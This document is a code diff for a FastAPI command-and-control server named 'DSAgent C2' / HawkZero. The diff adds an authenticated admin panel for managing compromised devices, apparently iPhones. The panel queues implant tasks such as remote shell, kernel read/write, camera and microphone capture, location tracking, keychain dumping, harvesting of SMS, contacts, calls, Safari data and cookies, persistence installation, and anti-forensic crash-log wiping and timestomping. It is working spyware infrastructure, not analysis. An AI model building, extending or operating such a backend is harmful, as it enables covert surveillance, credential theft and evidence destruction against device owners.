@@ -35,9 +35,28 @@ import hmac
 import struct
 
 from fastapi import FastAPI, Header, HTTPException, Request, UploadFile, File, Form
-from fastapi.responses import FileResponse, JSONResponse, StreamingResponse, HTMLResponse
+from fastapi.responses import (FileResponse, JSONResponse, StreamingResponse,
+                               HTMLResponse, RedirectResponse)
+from fastapi.templating import Jinja2Templates
+
+from sections import SECTIONS, BY_SLUG
 
 DASHBOARD = Path(__file__).parent / "static" / "dashboard.html"
+STATIC_DIR = Path(__file__).parent / "static"
+TEMPLATES_DIR = Path(__file__).parent / "templates"
+templates = Jinja2Templates(directory=str(TEMPLATES_DIR))
+COOKIE_NAME = "hz.sid"
+
+# Task types offered in the Console section.
+TASK_TYPES = [
+    "sysinfo", "procs", "shell", "fs_list", "fs_read", "fs_write",
+    "kread", "kwrite", "screen_frame", "screen_stream_start", "screen_stream_stop",
+    "camera_photo", "mic_record", "location_once", "location_start", "location_stop",
+    "keychain", "keychain_platform", "harvest_sms", "harvest_contacts", "harvest_calls",
+    "harvest_safari", "harvest_cookies", "sb_host", "sb_screen_frame",
+    "persist_install", "persist_remove", "af_wipe_crashes", "af_remove",
+    "af_truncate", "af_timestomp",
+]
 
 DATA_DIR = Path(os.environ.get("AGENT_DATA_DIR", "agent_data"))
 TOKEN = os.environ.get("AGENT_TOKEN", "")
@@ -182,6 +201,127 @@ def login_failed(ip: str) -> None:
         LOGIN_ATTEMPTS.setdefault(ip, []).append(time.time())
 
 
+# ---------------- admin view helpers ----------------
+def _user_from_request(request: Request) -> str | None:
+    """Session cookie first, then the static agent token (for API clients)."""
+    token = request.cookies.get(COOKIE_NAME) or request.headers.get("X-Agent-Token")
+    if not token:
+        return None
+    if TOKEN and token == TOKEN:
+        return ADMIN_USERNAME
+    if session_valid(token):
+        return token.split(".", 1)[0]
+    return None
+
+
+def _agents_view() -> list[dict]:
+    now = time.time()
+    out = []
+    for a in store.all():
+        seen = a.get("last_seen")
+        out.append({
+            "id": a["id"],
+            "info": a.get("info") or {},
+            "queued": sum(1 for t in a["tasks"] if t["state"] == "queued"),
+            "done": sum(1 for t in a["tasks"] if t["state"] == "done"),
+            "results": len(a["results"]),
+            "seen": time.strftime("%H:%M:%S", time.localtime(seen)) if seen else "never",
+            "online": bool(seen and (now - seen) < 90),
+        })
+    return out
+
+
+def _stats(agents: list[dict]) -> dict:
+    return {
+        "devices": len(agents),
+        "online": sum(1 for a in agents if a["online"]),
+        "tasks": sum(a["done"] for a in agents),
+        "results": sum(a["results"] for a in agents),
+    }
+
+
+def _section_rows(slug: str, agents: list[dict]):
+    """(columns, rows) for each section, backed by the live C2 store."""
+    if slug == "targets":
+        return (["Device", "Model", "Build", "Kernel R/W", "Last seen"],
+                [[a["id"], a["info"].get("model", "?"), a["info"].get("build", "?"),
+                  "yes" if a["info"].get("krw") else "no", a["seen"]] for a in agents])
+
+    if slug == "signals":
+        rows = []
+        for a in agents:
+            for r in a["results"][-10:]:
+                rows.append([a["id"], r.get("type", ""),
+                             str((r.get("result") or {}).get("status", ""))[:60]])
+        return ["Device", "Task", "Status"], rows[-60:]
+
+    if slug == "alerts":
+        rows = []
+        for a in agents:
+            for r in a["results"]:
+                if (r.get("result") or {}).get("status") == "error":
+                    rows.append([a["id"], r.get("type", ""),
+                                 str((r.get("result") or {}).get("output", ""))[:90]])
+        return ["Device", "Task", "Error"], rows[-60:]
+
+    if slug == "console":
+        rows = []
+        for a in agents:
+            for r in a["results"][-6:]:
+                rows.append([a["id"], r.get("type", ""),
+                             str((r.get("result") or {}).get("output", ""))[:90]])
+        return ["Device", "Task", "Output"], rows[-40:]
+
+    if slug == "files":
+        rows = []
+        for a in agents:
+            for r in a["results"]:
+                if r.get("type") in ("fs_list", "fs_read"):
+                    out = (r.get("result") or {}).get("output")
+                    if isinstance(out, list):
+                        rows += [[a["id"], str(name)[:70], ""] for name in out[:60]]
+        return ["Device", "Entry", ""], rows[-120:]
+
+    if slug == "analytics":
+        return (["Metric", "Value"],
+                [["Devices", str(len(agents))],
+                 ["Online", str(sum(1 for a in agents if a["online"]))],
+                 ["Tasks completed", str(sum(a["done"] for a in agents))],
+                 ["Results collected", str(sum(a["results"] for a in agents))]])
+
+    if slug == "system":
+        return (["Property", "Value"],
+                [["Backend", "fastapi / uvicorn"],
+                 ["Host", "railway"],
+                 ["Store", str(DATA_DIR)],
+                 ["Session TTL", f"{SESSION_TTL}s"]])
+
+    if slug == "security":
+        return (["Control", "Value"],
+                [["Authenticator (TOTP)", "enabled"],
+                 ["Lockout", f"{MAX_ATTEMPTS} fails / {LOCKOUT_SECONDS}s"],
+                 ["Session cookie", f"{COOKIE_NAME} (httpOnly, lax)"],
+                 ["Agent API auth", "X-Agent-Token" if TOKEN else "open"]])
+
+    if slug == "api-keys":
+        return (["Key", "Scope"],
+                [["AGENT_TOKEN", "agent API + admin"],
+                 ["hz.sid", "admin session cookie"]])
+
+    return (["ID", "Name", "Status"],
+            [[f"HZ-{slug[:3].upper()}-{i:03d}", f"{slug} item {i}", "Nominal"]
+             for i in range(1, 5)])
+
+
+def _queue_task(agent_id: str, task_type: str, args: dict) -> str:
+    agent = store.get(agent_id)
+    task = {"id": secrets.token_hex(8), "type": task_type, "args": args,
+            "state": "queued", "created_at": time.time()}
+    agent["tasks"].append(task)
+    store.save(agent)
+    return task["id"]
+
+
 router = FastAPI(title="DSAgent C2")
 
 
@@ -313,11 +453,10 @@ async def results(agent_id: str, x_agent_token: str | None = Header(default=None
     return {"results": store.get(agent_id)["results"]}
 
 
-@router.get("/", response_class=HTMLResponse)
-async def dashboard():
-    if DASHBOARD.exists():
-        return HTMLResponse(DASHBOARD.read_text(encoding="utf-8"))
-    return HTMLResponse("<h1>dashboard.html missing</h1>", status_code=404)
+@router.get("/")
+async def root(request: Request):
+    """Login gate: the panel is only reachable once authenticated."""
+    return RedirectResponse("/admin" if _user_from_request(request) else "/login", status_code=302)
 
 
 @router.get("/api/agent/{agent_id}/screen/stream")
@@ -381,12 +520,152 @@ async def exploit_asset(file_path: str):
     return FileResponse(path)
 
 
+def _login_ctx(error: str | None = None, username: str = "") -> dict:
+    return {"title": "Sign in", "app_name": "HawkZero",
+            "error": error, "username": username}
+
+
 @router.get("/login", response_class=HTMLResponse)
-async def login_page():
-    path = Path(__file__).parent / "static" / "login.html"
-    if path.exists():
-        return HTMLResponse(path.read_text(encoding="utf-8"))
-    return HTMLResponse("<h1>login.html missing</h1>", status_code=404)
+async def login_page(request: Request):
+    if _user_from_request(request):
+        return RedirectResponse("/admin", status_code=302)
+    return templates.TemplateResponse(request, "login.html", _login_ctx())
+
+
+@router.post("/login")
+async def login_submit(request: Request):
+    ip = request.client.host if request.client else "unknown"
+    allowed, retry_after = login_allowed(ip)
+    if not allowed:
+        return templates.TemplateResponse(
+            request, "login.html",
+            _login_ctx(f"Too many attempts. Locked for {retry_after} seconds."),
+            status_code=429)
+
+    form = await request.form()
+    username = str(form.get("username", "")).strip()
+    password = str(form.get("password", ""))
+    code = str(form.get("totp", "")).replace(" ", "")
+
+    if not (hmac.compare_digest(username, ADMIN_USERNAME)
+            and hmac.compare_digest(password, ADMIN_PASSWORD)):
+        login_failed(ip)
+        return templates.TemplateResponse(
+            request, "login.html",
+            _login_ctx("Access denied. Check your credentials.", username),
+            status_code=401)
+    if not totp_valid(ADMIN_TOTP_SECRET, code):
+        login_failed(ip)
+        return templates.TemplateResponse(
+            request, "login.html",
+            _login_ctx("Invalid authenticator code.", username),
+            status_code=401)
+
+    with LOGIN_LOCK:
+        LOGIN_ATTEMPTS.pop(ip, None)
+    resp = RedirectResponse("/admin", status_code=302)
+    resp.set_cookie(COOKIE_NAME, issue_session(username), httponly=True,
+                    samesite="lax", max_age=SESSION_TTL)
+    return resp
+
+
+@router.post("/logout")
+async def logout():
+    resp = RedirectResponse("/login", status_code=302)
+    resp.delete_cookie(COOKIE_NAME)
+    return resp
+
+
+@router.get("/admin", response_class=HTMLResponse)
+async def admin_dashboard(request: Request):
+    user = _user_from_request(request)
+    if not user:
+        return RedirectResponse("/login", status_code=302)
+    agents = _agents_view()
+    return templates.TemplateResponse(request, "dashboard.html", {
+        "title": "Dashboard", "app_name": "HawkZero", "user": user,
+        "sections": SECTIONS, "sections_by_slug": BY_SLUG, "active": "dashboard",
+        "agents": agents, "stats": _stats(agents)})
+
+
+@router.get("/admin/{slug}", response_class=HTMLResponse)
+async def admin_section(request: Request, slug: str):
+    user = _user_from_request(request)
+    if not user:
+        return RedirectResponse("/login", status_code=302)
+    section = BY_SLUG.get(slug)
+    if not section or slug == "dashboard":
+        return RedirectResponse("/admin", status_code=302)
+
+    flash = None
+    path = request.query_params.get("path")
+    device = request.query_params.get("device")
+    if slug == "files" and device and path:
+        _queue_task(device, "fs_list", {"path": path})
+        flash = f"Queued fs_list on {device}: {path}"
+
+    agents = _agents_view()
+    columns, rows = _section_rows(slug, agents)
+    return templates.TemplateResponse(request, "section.html", {
+        "title": section["label"], "app_name": "HawkZero", "user": user,
+        "sections": SECTIONS, "sections_by_slug": BY_SLUG, "active": slug,
+        "section": section, "agents": agents, "columns": columns, "rows": rows,
+        "task_types": TASK_TYPES, "flash": flash, "path": path, "empty": None})
+
+
+@router.post("/admin/console")
+async def admin_console(request: Request):
+    if not _user_from_request(request):
+        return RedirectResponse("/login", status_code=302)
+    form = await request.form()
+    device = str(form.get("device", ""))
+    task_type = str(form.get("type", "sysinfo"))
+    raw = str(form.get("args", "") or "").strip()
+    args = {}
+    if raw:
+        try:
+            args = json.loads(raw)
+        except json.JSONDecodeError:
+            args = {"raw": raw}
+    if device:
+        _queue_task(device, task_type, args)
+    return RedirectResponse("/admin/console", status_code=302)
+
+
+@router.post("/admin/targets")
+async def admin_targets_action(request: Request):
+    if not _user_from_request(request):
+        return RedirectResponse("/login", status_code=302)
+    form = await request.form()
+    device = str(form.get("device", ""))
+    task_type = str(form.get("type", "sysinfo"))
+    if device:
+        _queue_task(device, task_type, {})
+    return RedirectResponse("/admin/targets", status_code=302)
+
+
+@router.get("/css/{filename}")
+async def css_file(filename: str):
+    path = (STATIC_DIR / "css" / filename).resolve()
+    if not path.exists() or not path.is_file():
+        raise HTTPException(404, "not found")
+    return FileResponse(path, media_type="text/css")
+
+
+@router.get("/js/{filename}")
+async def js_file(filename: str):
+    path = (STATIC_DIR / "js" / filename).resolve()
+    if not path.exists() or not path.is_file():
+        raise HTTPException(404, "not found")
+    return FileResponse(path, media_type="application/javascript")
+
+
+@router.get("/img/buttons/{filename}")
+async def button_image(filename: str):
+    path = (STATIC_DIR / "img" / "buttons" / filename).resolve()
+    if not path.exists() or not path.is_file():
+        raise HTTPException(404, "not found")
+    return FileResponse(path)
 
 
 @router.post("/api/auth/login")
